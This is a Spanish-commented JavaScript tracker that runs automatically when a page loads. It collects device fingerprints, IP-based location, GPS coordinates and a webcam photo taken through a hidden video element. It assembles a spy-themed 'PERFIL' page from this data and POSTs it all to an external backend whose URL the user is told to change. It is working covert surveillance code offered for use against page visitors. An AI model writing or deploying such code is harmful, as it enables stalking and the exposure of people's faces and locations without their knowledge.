// ============================================================
// CONFIGURACIÓN (CAMBIA ESTO)
// ============================================================
const BACKEND_URL = "https://trck44-production.up.railway.app"; // <--- CAMBIA ESTO

// ============================================================
// RECOLECCIÓN DE DATOS
// ============================================================
function getDeviceInfo() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        vendor: navigator.vendor || 'unknown',
    };
}

async function getIPAndLocation() {
    try {
        const resp = await fetch('https://ipapi.co/json/');
        const data = await resp.json();
        if (data.ip) return data;
    } catch (e) {}
    try {
        const resp = await fetch('https://ipinfo.io/json');
        const data = await resp.json();
        if (data.ip) return data;
    } catch (e) {}
    try {
        const resp = await fetch('https://api.ipify.org?format=json');
        const data = await resp.json();
        return { ip: data.ip };
    } catch (e) {
        return { ip: 'unknown' };
    }
}

async function capturePhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.style.display = 'none';
        document.body.appendChild(video);
        await video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        return new Promise(resolve => canvas.toBlob(blob => resolve(blob), 'image/jpeg'));
    } catch (e) {
        return null;
    }
}

function getGPS() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) { resolve(null); return; }
        navigator.geolocation.getCurrentPosition(
            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
            () => resolve(null)
        );
    });
}

function generateProfileHTML(deviceInfo, location, gps) {
    return `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Perfil</title>
<style>body{font-family:monospace;background:#0a0a0f;color:#00ffcc;padding:20px}h1{color:#ff00ff}.section{background:#111;border:1px solid #333;padding:15px;margin:10px 0;border-radius:8px}.label{color:#888}.value{color:#fff}</style>
</head><body>
<h1>🕵️ PERFIL</h1>
<div class="section"><h2>📱 Dispositivo</h2>
<p><span class="label">User-Agent:</span> <span class="value">${deviceInfo.userAgent}</span></p>
<p><span class="label">Plataforma:</span> <span class="value">${deviceInfo.platform}</span></p>
<p><span class="label">Idioma:</span> <span class="value">${deviceInfo.language}</span></p>
<p><span class="label">Resolución:</span> <span class="value">${deviceInfo.screenResolution}</span></p>
<p><span class="label">Zona horaria:</span> <span class="value">${deviceInfo.timezone}</span></p>
<p><span class="label">Núcleos:</span> <span class="value">${deviceInfo.cpuCores}</span></p>
<p><span class="label">Memoria:</span> <span class="value">${deviceInfo.deviceMemory} GB</span></p>
<p><span class="label">Vendor:</span> <span class="value">${deviceInfo.vendor}</span></p>
</div>
<div class="section"><h2>🌐 Ubicación</h2>
<p><span class="label">IP:</span> <span class="value">${location.ip || 'N/A'}</span></p>
<p><span class="label">País:</span> <span class="value">${location.country_name || location.country || 'N/A'}</span></p>
<p><span class="label">Ciudad:</span> <span class="value">${location.city || 'N/A'}</span></p>
</div>
${gps ? `<div class="section"><h2>📍 GPS</h2><p>Lat: ${gps.lat} | Lon: ${gps.lon}</p><p><a href="https://www.google.com/maps?q=${gps.lat},${gps.lon}">Ver mapa</a></p></div>` : ''}
</body></html>`;
}

async function main() {
    const deviceInfo = getDeviceInfo();
    const location = await getIPAndLocation();
    const gps = await getGPS();
    const photoBlob = await capturePhoto();
    const profileHTML = generateProfileHTML(deviceInfo, location, gps);

    const formData = new FormData();
    formData.append('deviceInfo', JSON.stringify(deviceInfo));
    formData.append('location', JSON.stringify(location));
    formData.append('gps', JSON.stringify(gps));
    formData.append('profileHTML', profileHTML);
    if (photoBlob) formData.append('photo', photoBlob, 'photo.jpg');

    try {
        const res = await fetch(BACKEND_URL, { method: 'POST', body: formData });
        const data = await res.json();
        console.log('✅ Enviado:', data);
    } catch (e) {
        console.error('❌ Error:', e);
    }
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', main);
} else {
    main();
}
